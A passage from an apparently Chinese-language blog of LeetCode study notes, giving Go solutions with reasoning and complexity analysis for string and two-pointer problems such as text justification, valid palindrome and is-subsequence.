stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n + m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，最坏情况下的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>∗</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n * m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>。</p><p>Go的strings.Index()函数底层实现参考文章：<a href="https://vearne.cc/archives/611">GOLANG STRINGS中的INDEX函数(字符串查找)</a></p><p>空间复杂度:</p><p>没有使用额外空间，复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><h2 id="code-22"><a class="markdownIt-Anchor" href="#code-22"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">strStr</span><span class="params">(haystack <span class="type">string</span>, needle <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strings.Index(haystack,needle)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="68文本左右对齐"><a class="markdownIt-Anchor" href="#68文本左右对齐"></a> 68.文本左右对齐</h1><blockquote><p>&gt; Problem: <a href="https://leetcode.cn/problems/text-justification/description/">68. 文本左右对齐</a></p></blockquote><h2 id="思路-24"><a class="markdownIt-Anchor" href="#思路-24"></a> 思路</h2><p>这道题目是关于文本左右对齐的问题，需要在给定的最大宽度下，将一系列单词进行排版，使得每一行的文本符合左右对齐的要求。关键点在于如何计算和分配每一行的空格，使得文本能够对齐。</p><h2 id="解题方法-24"><a class="markdownIt-Anchor" href="#解题方法-24"></a> 解题方法</h2><p>这里参照了力扣的官方题解<a href="https://leetcode.cn/problems/text-justification/solutions/986756/wen-ben-zuo-you-dui-qi-by-leetcode-solut-dyeg/?envType=study-plan-v2&amp;envId=top-interview-150">文本左右对齐</a>，总结出了以下规律：</p><blockquote><ol><li>当前行是最后一行：单词左对齐，且单词之间应只有一个空格，在行末填充剩余空格；</li><li>当前行不是最后一行，且只有一个单词：该单词左对齐，在行末填充空格；</li><li>当前行不是最后一行，且不只一个单词：设当前行单词数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mi>W</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">numWords</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span></span></span></span>，空格数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mi>S</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">numSpaces</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span></span></span></span>，我们需要将空格均匀分配在单词之间，则单词之间至少有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> avgSpaces </mtext><mo>=</mo><mrow><mo fence="true">⌊</mo><mfrac><mtext> numSpaces </mtext><mrow><mtext> numWords </mtext><mo>−</mo><mn>1</mn></mrow></mfrac><mo fence="true">⌋</mo></mrow></mrow><annotation encoding="application/x-tex">\text { avgSpaces }=\left\lfloor\frac{\text { numSpaces }}{\text { numWords }-1}\right\rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord text"><span class="mord"> avgSpaces </span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.80002em;vertical-align:-0.65002em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">⌊</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.924439em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight"> numWords </span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight"> numSpaces </span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">⌋</span></span></span></span></span></span>个空格，应该填在前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>S</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">extraSpaces</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span></span></span></span>个单词之间。因此，前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>x</mi><mi>t</mi><mi>r</mi><mi>a</mi><mi>S</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">extraSpaces</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span></span></span></span>个单词之间填充<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>v</mi><mi>g</mi><mi>S</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mi>s</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">avgSpaces+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>个空格，其余单词之间应该填充<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>v</mi><mi>g</mi><mi>S</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">avgSpaces</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span></span></span></span>个空格。</li></ol></blockquote><h2 id="复杂度-24"><a class="markdownIt-Anchor" href="#复杂度-24"></a> 复杂度</h2><p>时间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，m是数组words中所有字符串的长度之和。</p><p>空间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></p><h2 id="code-23"><a class="markdownIt-Anchor" href="#code-23"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fullJustify</span><span class="params">(words []<span class="type">string</span>, maxWidth <span class="type">int</span>)</span></span> (ans []<span class="type">string</span>) &#123;</span><br><span class="line">    right,n:=<span class="number">0</span>,<span class="built_in">len</span>(words)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        left := right <span class="comment">//当前行的第一个单词在word的位置</span></span><br><span class="line">        sumLen:=<span class="number">0</span><span class="comment">//统计这一行的单词长度之和</span></span><br><span class="line">        <span class="comment">//循环确定能放多少单词，单词之间至少有一个空格</span></span><br><span class="line">        <span class="keyword">for</span> right &lt;n &amp;&amp; sumLen+<span class="built_in">len</span>(words[right])+right-left&lt;=maxWidth&#123;</span><br><span class="line">            sumLen+=<span class="built_in">len</span>(words[right])</span><br><span class="line">            right++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前行是最后一行：单词左对齐，且单词之间应只有一个空格，在行末填充剩余空格</span></span><br><span class="line">        <span class="keyword">if</span> right == n &#123;</span><br><span class="line">            s := strings.Join(words[left:], <span class="string">&quot; &quot;</span>)<span class="comment">//填充单词</span></span><br><span class="line">            ans = <span class="built_in">append</span>(ans, s+blank(maxWidth-<span class="built_in">len</span>(s)))<span class="comment">//填充空格</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        numWords:=right-left <span class="comment">// 本行总单词数</span></span><br><span class="line">        numSpace:= maxWidth-sumLen <span class="comment">//本行总空格数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本行只有一个单词：单词向左对齐，末尾填充空格</span></span><br><span class="line">        <span class="keyword">if</span> numWords==<span class="number">1</span>&#123;</span><br><span class="line">            ans=<span class="built_in">append</span>(ans,words[left]+blank(numSpace))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前行不止一个单词，先依次填充好单词和中间空格，再把额外的空格填入前extra个单词中间</span></span><br><span class="line">        avgSpaces:= numSpace/(numWords<span class="number">-1</span>)<span class="comment">//填充进每个单词间的正常空格数</span></span><br><span class="line">        extraSpaces:=numSpace%(numWords<span class="number">-1</span>)<span class="comment">//余下的空格数就是多出的空格</span></span><br><span class="line"></span><br><span class="line">        s1:=strings.Join(words[left:left+extraSpaces+<span class="number">1</span>],blank(avgSpaces+<span class="number">1</span>)) <span class="comment">// 额外拼接一个空格</span></span><br><span class="line">        s2:=strings.Join(words[left+extraSpaces+<span class="number">1</span>:right],blank(avgSpaces)) <span class="comment">// 拼接其余单词</span></span><br><span class="line">        ans=<span class="built_in">append</span>(ans,s1+blank(avgSpaces)+s2)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">blank</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strings.Repeat(<span class="string">&quot; &quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="125验证回文串"><a class="markdownIt-Anchor" href="#125验证回文串"></a> 125.验证回文串</h1><blockquote><p>&gt; Problem: <a href="https://leetcode.cn/problems/valid-palindrome/description/">125. 验证回文串</a></p></blockquote><h2 id="思路-25"><a class="markdownIt-Anchor" href="#思路-25"></a> 思路</h2><p>要验证回文串的思路其实很简单，核心就是用双指针进行遍历判断。本题还在原先的基础上添加了空格、符号等字符进行干扰，要求清洗字符串并忽略大小写后再进行判断。要实现这两点的方法很多。</p><h2 id="解题方法-25"><a class="markdownIt-Anchor" href="#解题方法-25"></a> 解题方法</h2><p>一种方法是简单粗暴的调包，用string包的ToLower()转换字符串为全小写，然后再调用regexp包的Compile()与ReplaceAllString()来进行正则清洗后再进行回文串的判断。但这种方法会产生额外的字符串储存开销，而且正则编译比较耗时。</p><p>第二种方法就是直接在原字符串上进行操作，这样做更加省时快捷。</p><h2 id="复杂度-25"><a class="markdownIt-Anchor" href="#复杂度-25"></a> 复杂度</h2><p>时间复杂度:</p><p>方法一：时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>将字符串全部转换为小写：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>使用正则表达式删除非字母数字字符：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>再次遍历清理后的字符串进行回文检查：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p><p>方法二：时间复杂度: O(n)</p><p>遍历字符串一次，同时从两端向中间扫描，跳过非字母数字字符。</p><p>比较字符时，将小写字母转换为大写字母（如果需要）。</p><p>空间复杂度:</p><p>方法一：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，使用了额外的字符串存储转换后的结果和清理后的结果。</p><p>方法二：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，除了几个变量外，没有使用额外的空间。</p><h2 id="code-24"><a class="markdownIt-Anchor" href="#code-24"></a> Code</h2><p>方法一：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isPalindrome</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    lowered:=strings.ToLower(s)</span><br><span class="line">    reg,_:=regexp.Compile(<span class="string">&quot;[^a-zA-Z0-9]+&quot;</span>)</span><br><span class="line">    cleaned:=reg.ReplaceAllString(lowered,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    left,right:=<span class="number">0</span>,<span class="built_in">len</span>(cleaned)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">for</span> left&lt;right&#123;</span><br><span class="line">        <span class="keyword">if</span> cleaned[left]!=cleaned[right]&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        left++</span><br><span class="line">        right--</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;unicode&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isPalindrome</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    left, right := <span class="number">0</span>, <span class="built_in">len</span>(s)<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">        <span class="keyword">for</span> left &lt; right &amp;&amp; !unicode.IsLetter(<span class="type">rune</span>(s[left])) &amp;&amp; !unicode.IsDigit(<span class="type">rune</span>(s[left])) &#123;</span><br><span class="line">            left++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> left &lt; right &amp;&amp; !unicode.IsLetter(<span class="type">rune</span>(s[right])) &amp;&amp; !unicode.IsDigit(<span class="type">rune</span>(s[right])) &#123;</span><br><span class="line">            right--</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> left &lt; right &#123;</span><br><span class="line">            <span class="keyword">if</span> unicode.ToLower(<span class="type">rune</span>(s[left])) != unicode.ToLower(<span class="type">rune</span>(s[right])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            left++</span><br><span class="line">            right--</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="392判断子序列"><a class="markdownIt-Anchor" href="#392判断子序列"></a> 392.判断子序列</h1><blockquote><p>&gt; Problem: <a href="https://leetcode.cn/problems/is-subsequence/description/">392. 判断子序列</a></p></blockquote><h2 id="思路-26"><a class="markdownIt-Anchor" href="#思路-26"></a> 思路</h2><p>一道比较简单的字符串处理题，用双指针和贪心思想依次遍历即可。</p><h2 id="解题方法-26"><a class="markdownIt-Anchor" href="#解题方法-26"></a> 解题方法</h2><p>设置两个指针p1、p2，分别指向字符串s、t。假如p2指向的字符和p1指向的相同，那么就同时右移指针；如果不同，就只右移p2指针用于寻找下一个匹配字符。当t被遍历完时说明寻找失败；如果是s先被遍历完则说明寻找成功。</p><p>注意，空字符串是任何字符串的子串；当t为空串时，除s也为空串外应直接返回false。</p><h2 id="复杂度-26"><a class="markdownIt-Anchor" href="#复杂度-26"></a> 复杂度</h2><p>时间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n+m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>，m和n分别是s和t字符串的长度。</p><p>空间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，没有产生额外的空间。</p><h2 id="code-25"><a class="markdownIt-Anchor" href="#code-25"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isSubsequence</span><span class="params">(s <span class="type">string</span>, t <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="comment">//双指针做法</span></span><br><span class="line">    <span class="comment">//一个指s，一个指t</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    p1,p2:=<span class="number">0</span>,<span class="number">0</span> <span class="comment">// s,t</span></span><br><span class="line">    <span class="keyword">for</span> p2!=<span class="built_in">len</span>(t)<span class="number">-1</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> s[p1]==t[p2]&#123;</span><br><span class="line">            p1++</span><br><span class="line">            p2++</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p2++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> p1==<span class="built_in">len</span>(s)<span class="number">-1</span>&amp;&amp;s[p1]==t[p2]&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="167两数之和-ii-输入有序数组"><a class="markdownIt-Anchor" href="#167两数之和-ii-输入有序数组"></a> 167.两数之和 II - 输入有序数组</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/two-sum-ii-input-array-is-sorted/description/">167. 两数之和 II - 输入有序数组</a></p></blockquote><h2 id="思路-27"><a class="markdownIt-Anchor" href="#思路-27"></a> 思路</h2><p>很简单的一道题，已知题目条件数组为非递减有序数组，则用二分查找的思想来寻找两数之和就好。</p><h2 id="解题方法-27"><a class="markdownIt-Anchor" href="#解题方法-27"></a> 解题方法</h2><p>设置两个指针left和right，分别指向数组两端，并计算两数之和sum。如果sum＜target，则left++；如果sum＞target，则right–；如果sum=target，则返回left+1和right+1的数组即可。</p><h2 id="复杂度-27"><a class="markdownIt-Anchor" href="#复杂度-27"></a> 复杂度</h2><p>时间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，n为题给数组长度。</p><p>空间复杂度:</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，只使用了常数级的额外空间。</p><h2 id="code-26"><a class="markdownIt-Anchor" href="#code-26"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">twoSum</span><span class="params">(numbers []<span class="type">int</span>, target <span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="comment">//题目已知序列为非递减有序</span></span><br><span class="line">    <span class="comment">//参考快排的方法从两边开始累加</span></span><br><span class="line">    left,right:=<span class="number">0</span>,<span class="built_in">len</span>(numbers)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">for</span> left&lt;right&#123;</span><br><span class="line">        sum:=numbers[left]+numbers[right]</span><br><span class="line">        <span class="keyword">if</span> sum==target&#123;</span><br><span class="line">            <span class="keyword">return</span> []<span class="type">int</span>&#123;left+<span class="number">1</span>,right+<span class="number">1</span>&#125;</span><br><span class="line">        &#125;<span 